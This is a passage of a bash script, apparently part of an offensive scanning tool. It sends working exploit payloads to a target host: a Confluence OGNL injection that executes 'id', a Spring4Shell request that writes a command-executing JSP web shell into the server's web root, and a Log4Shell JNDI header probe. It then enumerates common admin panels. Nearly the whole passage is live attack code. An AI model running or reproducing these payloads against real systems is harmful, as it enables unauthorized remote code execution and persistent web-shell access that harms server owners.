    local cve_2022_26134=$(curl -sk --max-time 8 "https://${target}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" 2>/dev/null)
    [ -n "$cve_2022_26134" ] && { echo "CVE-2022-26134: Confluence OGNL" >> "$SESSION/rt/cve_infra.txt"; rt "Confluence OGNL!"; }

    # CVE-2022-22965: Spring4Shell — Spring Framework RCE
    local cve_2022_22965=$(curl -sk --max-time 8 -X POST -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" "https://${target}/" 2>/dev/null)
    [ -n "$cve_2022_22965" ] && { echo "CVE-2022-22965: Spring4Shell" >> "$SESSION/rt/cve_infra.txt"; rt "Spring4Shell!"; }

    # CVE-2021-44228: Log4Shell again universal
    local cve_2021_44228_again=$(curl -sk --max-time 8 -H "X-Api-Version: \${jndi:dns://x.${target}}" "https://${target}/" 2>/dev/null)
    [ -n "$cve_2021_44228_again" ] && echo "CVE-2021-44228: Log4Shell universal" >> "$SESSION/rt/cve_infra.txt"

    # Check common admin panels
    local panels=("/manager/html" "/admin" "/administrator" "/phpmyadmin" "/pma" "/console" "/actuator" "/solr" "/grafana")
    for panel in "${panels[@]}"; do
        local code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 -A "Mozilla/5.0" "https://${target}${panel}" 2>/dev/null)
        [ "$code" = "200" ] && echo "PANEL: ${panel} HTTP 200" >> "$SESSION/rt/cve_infra.txt" && rt "Admin panel: ${panel}"
    done

    local cve_count=$(grep -c "CVE-" "$SESSION/rt/cve_infra.txt" 2>/dev/null || echo 0)
    [ "$cve_count" -gt 0 ] && rt "${cve_count} Infra CVEs tested" || info "No infra CVEs triggered"
}

